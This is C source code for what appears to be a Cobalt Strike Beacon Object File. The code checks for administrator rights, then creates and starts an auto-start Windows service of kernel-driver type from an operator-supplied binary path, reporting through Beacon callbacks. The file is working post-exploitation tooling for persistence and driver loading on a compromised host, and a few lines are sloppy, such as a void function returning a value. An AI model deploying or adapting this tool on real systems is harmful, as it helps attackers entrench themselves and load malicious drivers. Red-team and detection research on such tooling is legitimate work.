#include <windows.h>
#include <stdio.h>
#include "csb.h"
#include "beacon.h"

void go(char *buff, int len) {
	// creating service VARIABLES
	SC_HANDLE shManager = NULL, hService = NULL;
	datap parser;
	char *servicename;
	char *displayname;
	//SC_MANAGER_ALL_ACCESS(0xF003F) or SC_MANAGER_CREATE_SERVICE(0x0002)
	//SERVICE_WIN32_OWN_PROCESS
	//SERVICE_AUTO_START
	//SERVICE_ERROR_NORMAL
	char *binarypathname;
	WCHAR* choice;

	BeaconDataParse(&parser, buff, len);
	choice = BeaconDataExtract(&parser, NULL);
	servicename = BeaconDataExtract(&parser, NULL);
	displayname = BeaconDataExtract(&parser, NULL);
	binarypathname = BeaconDataExtract(&parser, NULL);

	// check: do you have Administrator privileges
	// if you don't have Administrator privileges the schedules task will try to be made
	if(!BeaconIsAdmin()) {
		BeaconPrintf(CALLBACK_OUTPUT, "csb BOF: You don't have Administrator privileges");
		return 0;
	} else { // creating service - done
		BeaconPrintf(CALLBACK_OUTPUT, "csb BOF: You have Administrator privileges :D");

		// create service
		BeaconPrintf(CALLBACK_OUTPUT, "csb BOF: Service has started to be created");
		shManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		// in my case a SERVICE_AUTO_START as 6th variable was a must in another case I was getting 87 error code which invalid parameter
		hService = ADVAPI32$CreateServiceA(shManager, servicename, displayname, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, binarypathname, NULL, NULL, NULL, NULL, NULL);

		// does service was created?
		if(!hService) {
			BeaconPrintf(CALLBACK_ERROR, "csb BOF: Error during CreateServiceA function: %d", KERNEL32$GetLastError());
			BeaconPrintf(CALLBACK_ERROR, "csb BOF: Probably your service called %s exists, please change name of the service!!!", servicename);
		}
		else {
			ADVAPI32$StartServiceA(hService, NULL, NULL);
		    BeaconPrintf(CALLBACK_OUTPUT, "csb BOF: Service called %s is created", servicename);
			BeaconPrintf(CALLBACK_OUTPUT, "csb BOF: path: %s", binarypathname);
        	BeaconPrintf(CALLBACK_OUTPUT, "csb BOF: Thank you for your patient ;P");
			ADVAPI32$CloseServiceHandle(hService);
			ADVAPI32$CloseServiceHandle(shManager);
		}
	}
}